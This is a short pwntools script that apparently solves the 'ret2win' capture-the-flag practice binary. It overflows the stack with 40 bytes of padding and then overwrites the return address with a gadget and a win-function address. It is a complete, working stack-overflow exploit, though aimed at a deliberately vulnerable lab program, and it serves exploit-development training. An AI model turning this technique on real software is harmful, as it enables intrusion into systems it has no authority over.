from pwn import *

io=process('./ret2win')

payload= b'a' * 40
payload+= p64(0x40053e)
payload+= p64(0x400756)
io.sendline(payload)
io.interactive()
